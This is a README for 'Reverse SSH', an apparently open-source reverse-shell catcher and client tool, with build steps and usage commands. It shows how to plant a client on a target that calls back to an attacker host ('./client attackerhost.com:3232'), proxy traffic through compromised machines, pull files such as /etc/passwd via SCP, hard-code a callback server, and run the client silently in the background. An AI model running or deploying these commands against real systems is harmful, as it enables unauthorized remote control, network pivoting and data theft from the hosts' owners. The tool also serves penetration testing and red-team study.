# Reverse SSH

Ever wanted to use SSH for reverse shells? Well now you can.  

The reverse SSH server lets you catch multiple reverse shells, using the fully statically compiled reverse shell binary.

```text
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+ Shelled |
                    |    Reverse     |       |         |  Client |
                    |  Connection    |       |         |         |
                    |    Catcher     |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |         |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         | Shelled |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         | Shelled |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```

## TL;DR

```sh
make
cd bin/

cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232

#copy client to your target 
./client attackerhost.com:3232

#connect to the server from your attacker host
ssh localhost -p 3232
```

## Setup Instructions

```sh
make
```

Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy the corresponding public key to the `authorized_controllee_keys` file to enable the reverse shell to connect.
If you need to build the client for a different architecture.

```sh
GOOS=linux GOARCH=amd64 make client
GOOS=windows GOARCH=amd64 make client # will create client.exe
```

You will need to create an `authorized_keys` file, containing *your* public key.
This will allow you to control whatever server catches.

```sh
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

Put the client binary on whatever you want to control.

```sh
./client yourserver.com:3232
```

Then connect to your reverse shell catcher server:

```sh
ssh yourserver.com -p 3232
```

## Features

### Proxy

Using just the general dynamical forward `-D` flag you can proxy network traffic to your controlled hosts.

First you connect to your reverse shell catcher.

```sh
ssh -D 9050 catcher.com -p 3232
```

Then use the `proxy connect <remote_id>` command to connect to your reverse shell.

```sh
catcher$ proxy connect 0bda3b12d3ce83f895632d412261073dc93dba3e 
Connected: 0bda3b12d3ce83f895632d412261073dc93dba3e
catcher$ 
```

After this, just point your tools/web browser to the socks5 port open on your local machine (in this example on port 9050) and you're away laughing.

You can obviously only proxy to one host at a time.

### SCP

You can transfer files to and from your controlled hosts using SCP. Essentially you address which host you want to download/upload to by `<ip_address>:<remote_id>:/path/here`.

e.g to upload the directory test to the host `0be2782caae4bedff780e14526f7618ab61e24fa`:

```sh
scp -r -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:$(pwd -P)/test2
```

Or to download `/etc/passwd` from a host:

```sh
scp -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:/etc/passwd
```

### Shell

On connection you will be presented by a list of controllable clients, e.g:

```sh
catcher$ ls
                                Targets
+------------------------------------------+------------+-------------+
| ID                                       | Hostname   | IP Address  |
+------------------------------------------+------------+-------------+
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root@wombo | [::1]:45150 |
+------------------------------------------+------------+-------------+
```

Use `help` or press `tab` to view commands.  
Tab will auto complete entries.
So you you wanted to connect to the client given in the example:

```sh
> connect a<TAB>
```

Will auto complete the entry for you and on enter will connect you to your reverse shell.

### Default Server

At build time, you can specify a default server for the client binary to connect to:

```sh
$ RSSH_HOMESERVER=localhost:1234 make

# Will connect to localhost:1234, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to example.com:1234
$ bin/client example.com:1234
```

## Foreground vs Background

By default, clients will run in the background. When started they will execute a new background instance (thus forking a new child process) and then the parent process will exit. If the fork is successful the message "Ending parent" will be printed.

This has one important ramification: once in the background a client will not show any output, including connection failure messages. If you need to debug your client, use the `--foreground` flag.
